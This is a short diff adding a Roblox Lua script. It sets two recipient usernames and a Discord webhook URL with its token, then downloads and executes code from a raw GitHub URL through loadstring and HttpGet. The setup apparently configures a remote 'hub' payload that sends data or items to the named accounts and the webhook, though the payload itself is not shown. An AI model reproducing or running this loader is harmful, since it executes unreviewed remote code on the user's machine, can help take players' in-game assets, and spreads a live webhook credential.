@@ -1,0 +1,5 @@
+_G.UserName = "ItsBman135443"
+_G.UserName2 = "PikachucrackESP_40L"
+_G.Webhook = "https://discord.com/api/webhooks/1098821249515393025/f5xqrVlNfJTXaT1ixrSowvZPAfI3RHM1cO6Mr_iA74bLxiB6Q_y3b9tDbUPHdRGDuTrH"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nulleddd/jmesfo00/main/HubJ0mes", true))()
